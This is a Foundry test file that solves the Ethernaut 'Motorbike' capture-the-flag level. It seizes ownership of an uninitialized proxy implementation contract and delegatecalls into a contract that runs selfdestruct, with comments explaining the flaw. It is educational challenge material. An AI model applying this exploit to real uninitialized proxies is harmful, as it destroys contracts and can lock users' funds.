// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import "forge-std/Test.sol";
import "../utils.sol";

interface IEngine {
  function initialize() external;
  function upgradeToAndCall(address, bytes memory) external;
}

contract AttackerContract {
  function attack() external {
    selfdestruct(payable(msg.sender));
  }
}

contract MotorBikeTest is Test {
  bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

  address internal challengeAddress;
  IEngine engine;

  function setUp() public {
    challengeAddress = utils.createLevelInstance(0x9b261b23cE149422DE75907C6ac0C30cEc4e652A);

    runExploit();
  }

  function runExploit() public {
    // the goal is to selfdestruct the engine at motorbike
    // - notice that Engine has a function _upgradeToAndCall(address, bytes)
    //   that performs delegatecall() with whatever you give to it.
    // - now, _upgradeToAndCall is internal and called by upgradeToAndCall()
    //   and there is a nasty guard _authorizeUpgrade() that requires you
    //   to be the owner
    // - where's the trick?
    //   the trick is on the proxy architecture: All its variables are
    //   in slots at the MotorBike instance.
    // - then if you find a way to this Engine instance,
    //   you can initialize() it and become its owner.

    // get the address to the Engine instance
    address engineAddress = address(uint160(uint256((vm.load(challengeAddress, _IMPLEMENTATION_SLOT)))));
    engine = IEngine(engineAddress);

    // initialize to become the owner
    engine.initialize();

    // create your attacker
    AttackerContract attacker = new AttackerContract();

    // call the upgrader, which will delegatecall the function
    // containing the selfdestruct instruction
    engine.upgradeToAndCall(address(attacker), abi.encodeWithSignature("attack()"));
  }

  function testExploit() public {
    // we need another transaction
    // to verify the destruction of the engine
    // made at testExploit() above
    utils.submitLevelInstance(challengeAddress);
  }
}

